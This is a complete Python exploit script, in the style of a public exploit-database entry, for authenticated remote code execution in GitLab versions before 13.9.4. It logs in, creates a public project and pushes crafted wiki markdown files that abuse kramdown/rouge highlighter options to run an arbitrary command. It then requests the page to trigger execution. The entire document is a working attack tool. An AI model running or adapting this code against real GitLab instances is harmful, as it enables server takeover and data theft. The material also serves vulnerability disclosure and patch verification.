# Exploit Title: Gitlab 13.9.3 - Remote Code Execution (Authenticated)
# Date: 02/06/2021
# Exploit Author: enox
# Vendor Homepage: https://about.gitlab.com/
# Software Link: https://gitlab.com/
# Version: < 13.9.4
# Tested On: Ubuntu 20.04
# Environment: Gitlab 13.9.1 CE
# Credits: https://hackerone.com/reports/1125425

#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import random
import os
import argparse

parser = argparse.ArgumentParser(description='GitLab < 13.9.4 RCE')
parser.add_argument('-u', help='Username', required=True)
parser.add_argument('-p', help='Password', required=True)
parser.add_argument('-c', help='Command', required=True)
parser.add_argument('-t', help='URL (Eg: http://gitlab.example.com)', required=True)
args = parser.parse_args()

username = args.u
password = args.p
gitlab_url = args.t
command = args.c

session = requests.Session()

# Authenticating
print("[1] Authenticating")
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
token = soup.findAll('meta')[16].get("content")

login_form = {
    "authenticity_token": token,
    "user[login]": username,
    "user[password]": password,
    "user[remember_me]": "0"
}
r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)

if r.status_code != 200:
    exit(f"Login Failed:{r.text}")
else:
    print("Successfully Authenticated")

# Creating Project
print("[2] Creating Project")
r = session.get(f"{gitlab_url}/projects/new")
soup = BeautifulSoup(r.text, features="lxml")

project_token = soup.findAll('meta')[16].get("content")
project_token = project_token.replace("==", "%3D%3D")
project_token = project_token.replace("+", "%2B")
project_name = f'project{random.randrange(1, 10000)}'
cookies = {'sidebar_collapsed': 'false','event_filter': 'all','hide_auto_devops_implicitly_enabled_banner_1': 'false','_gitlab_session': session.cookies['_gitlab_session'],}

payload=f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=20"

r = session.post(gitlab_url+'/projects', data=payload, cookies=cookies, verify=False)

if "The change you requested was rejected." in r.text:
    exit('Exploit failed, check input params')
else:
    print("Successfully created project")


# Cloning Wiki and Writing Files
print("[3] Pushing files to the project wiki")
wiki_url = f'{gitlab_url}/{username}/{project_name}.wiki.git'
os.system(f"git clone {wiki_url} /tmp/project")

f1 = open("/tmp/project/load1.rmd","w")
f1.write('{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../get_process_mem\}" /}\n\n')
f1.write('~~~ ruby\n')
f1.write('    def what?\n')
f1.write('      42\n')
f1.write('    end\n')
f1.write('~~~\n')
f1.close()

f2 = open("/tmp/project/load2.rmd","w")
temp='{::options syntax_highlighter="rouge" syntax_highlighter_opts="{a: \'`'+command+'`\', formatter: GetProcessMem\}" /}\n\n'
f2.write(temp)
f2.write('~~~ ruby\n')
f2.write('    def what?\n')
f2.write('      42\n')
f2.write('    end\n')
f2.write('~~~\n')
f2.close()

# It will prompt for user and pass. Enter it.
os.system('cd /tmp/project && git add -A . && git commit -m "Commit69" && git push')

print("Succesfully Pushed")

# Cleaning Up
os.system('rm -rf /tmp/project')

# Triggering RCE

print("[4] Triggering RCE")
trigger_url=f"{gitlab_url}/{username}/{project_name}/-/wikis/load2"

r = session.get(trigger_url, cookies=cookies, verify=False)